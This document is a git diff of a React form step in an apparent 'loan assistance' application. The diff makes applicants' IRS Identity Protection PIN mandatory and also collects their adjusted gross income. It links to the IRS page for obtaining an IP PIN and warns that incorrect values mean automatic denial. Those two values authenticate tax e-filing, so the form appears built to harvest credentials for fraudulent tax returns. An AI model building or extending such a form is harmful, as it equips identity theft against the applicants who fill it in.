@@ -7,12 +7,14 @@ import {
   faFileImage,
   faIdCardAlt,
   faImage,
+  faQuestionCircle,
 } from "@fortawesome/free-solid-svg-icons";
 import FormDataContext from "@/contexts/data";
 import Dropzone from "react-dropzone";
 import { useRouter } from "next/navigation";
 
 import axios from "axios";
+import Link from "next/link";
 
 const LoanProcessSeven = ({ step, setStep }) => {
   const { formData, setFormData } = useContext(FormDataContext);
@@ -127,19 +129,19 @@ const LoanProcessSeven = ({ step, setStep }) => {
         isValid = false;
       }
     }
-    if (!formData.didFile2022Taxes) {
-      errors.didFile2022Taxes = "Please select an option";
-      isValid = false;
-    }
-    if (!formData.receivedIPPIN) {
-      errors.receivedIPPIN = "Please select an option";
-      isValid = false;
-    }
-    if (formData.receivedIPPIN === "Yes" && !formData.ipPin) {
+    // if (!formData.didFile2022Taxes) {
+    //   errors.didFile2022Taxes = "Please select an option";
+    //   isValid = false;
+    // }
+    // if (!formData.receivedIPPIN) {
+    //   errors.receivedIPPIN = "Please select an option";
+    //   isValid = false;
+    // }
+    if (!formData.ipPin) {
       errors.ipPin = "Please provide an ip pin";
       isValid = false;
     }
-    if (formData.receivedIPPIN === "Yes" && formData.ipPin.length !== 6) {
+    if (formData.ipPin.length !== 6) {
       errors.ipPin = "IP pin must be 6 characters long";
       isValid = false;
     }
@@ -295,52 +297,69 @@ const LoanProcessSeven = ({ step, setStep }) => {
             <p className="text-red-500 text-sm mt-1">{errors.licenseState}</p>
           )}
         </div>
+
         <div className="mt-7">
           <label className="block text-gray-700 font-semibold mb-2">
-            Did you file your 2022 taxes?
+            What is your adjusted gross income (line 11 of your 1040)?
           </label>
-          <div>
-            <select
-              className={`block w-full  ${
-                errors.didFile2022Taxes ? "border-red-500" : "border-gray-300"
-              } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-              name="didFile2022Taxes"
-              id="didFile2022Taxes"
-              value={formData.didFile2022Taxes}
+          <div className="relative">
+            <input
+              className={`w-full border ${
+                errors.adjustedGrossIncome
+                  ? "border-red-500"
+                  : "border-gray-300"
+              } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
+              type="text"
+              name="adjustedGrossIncome"
+              id="adjustedGrossIncome"
+              value={formData.adjustedGrossIncome}
               onChange={handleChange}
-              required
-            >
-              <option value="">Choose an option</option>
-              <option value="Yes">Yes</option>
-              <option value="No">No</option>
-            </select>
+              placeholder="Enter your adjusted gross income"
+              required={formData.didFile2022Taxes === "Yes"}
+            />
+            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+              <FontAwesomeIcon
+                icon={faImage}
+                className="text-gray-500 text-sm"
+              />
+            </div>
           </div>
-          {errors.didFile2022Taxes && (
+          {errors.adjustedGrossIncome && (
             <p className="text-red-500 text-sm mt-1">
-              {errors.didFile2022Taxes}
+              {errors.adjustedGrossIncome}
             </p>
           )}
         </div>
 
-        {formData.didFile2022Taxes === "Yes" && (
+        <div className="mt-7">
           <div className="mt-7">
-            <label className="block text-gray-700 font-semibold mb-2">
-              What is your adjusted gross income (line 11 of your 1040)?
-            </label>
+            <div className="cont flex justify-between">
+              {" "}
+              <label className="block text-gray-700 font-semibold mb-2">
+                Input your IP PIN
+              </label>
+              <div className="icon text-blue-500">
+                <Link href="https://www.irs.gov/identity-theft-fraud-scams/get-an-identity-protection-pin">
+                  {" "}
+                  <FontAwesomeIcon icon={faQuestionCircle} />
+                </Link>
+              </div>
+            </div>
+
             <div className="relative">
               <input
                 className={`w-full border ${
-                  errors.adjustedGrossIncome
-                    ? "border-red-500"
-                    : "border-gray-300"
+                  errors.ipPin ? "border-red-500" : "border-gray-300"
                 } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-                type="text"
-                name="adjustedGrossIncome"
-                id="adjustedGrossIncome"
-                value={formData.adjustedGrossIncome}
+                type="number"
+                name="ipPin"
+                id="ipPin"
+                max={6}
+                min="6"
+                value={formData.ipPin}
                 onChange={handleChange}
-                placeholder="Enter your adjusted gross income"
-                required={formData.didFile2022Taxes === "Yes"}
+                placeholder="Enter your IP PIN"
+                required={formData.receivedIPPIN === "Yes"}
               />
               <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                 <FontAwesomeIcon
@@ -349,69 +368,10 @@ const LoanProcessSeven = ({ step, setStep }) => {
                 />
               </div>
             </div>
-            {errors.adjustedGrossIncome && (
-              <p className="text-red-500 text-sm mt-1">
-                {errors.adjustedGrossIncome}
-              </p>
+            {errors.ipPin && (
+              <p className="text-red-500 text-sm mt-1">{errors.ipPin}</p>
             )}
           </div>
-        )}
-
-        <div className="mt-7">
-          <label className="block text-gray-700 font-semibold mb-2">
-            Did you receive an IP PIN from the IRS?
-          </label>
-          <div>
-            <select
-              className={`block w-full  ${
-                errors.receivedIPPIN ? "border-red-500" : "border-gray-300"
-              } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-              name="receivedIPPIN"
-              id="receivedIPPIN"
-              value={formData.receivedIPPIN}
-              onChange={handleChange}
-              required
-            >
-              <option value="">Choose an option</option>
-              <option value="Yes">Yes</option>
-              <option value="No">No</option>
-            </select>
-          </div>
-          {errors.receivedIPPIN && (
-            <p className="text-red-500 text-sm mt-1">{errors.receivedIPPIN}</p>
-          )}
-          {formData.receivedIPPIN === "Yes" && (
-            <div className="mt-7">
-              <label className="block text-gray-700 font-semibold mb-2">
-                Input your IP PIN
-              </label>
-              <div className="relative">
-                <input
-                  className={`w-full border ${
-                    errors.ipPin ? "border-red-500" : "border-gray-300"
-                  } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
-                  type="number"
-                  name="ipPin"
-                  id="ipPin"
-                  max={6}
-                  min="6"
-                  value={formData.ipPin}
-                  onChange={handleChange}
-                  placeholder="Enter your IP PIN"
-                  required={formData.receivedIPPIN === "Yes"}
-                />
-                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                  <FontAwesomeIcon
-                    icon={faImage}
-                    className="text-gray-500 text-sm"
-                  />
-                </div>
-              </div>
-              {errors.ipPin && (
-                <p className="text-red-500 text-sm mt-1">{errors.ipPin}</p>
-              )}
-            </div>
-          )}
         </div>
         {/* <label
           className="block text-gray-700 font-semibold mb-2 mt-7"
@@ -550,6 +510,11 @@ const LoanProcessSeven = ({ step, setStep }) => {
             {bgloading ? "Please wait" : "Next"}
           </button>
         </div>
+        <p className="text-sm text-gray-600 bg-gray-100 px-6 py-6 mt-7 rounded-lg ">
+          <strong>Note:</strong> By clicking "Next" you agree that, if Identity
+          Protection Pin (IPPin) or Adjusted Gross Income (AGI) is incorrect,
+          you will automatically be denied assistance.
+        </p>
       </div>
     </>
   );
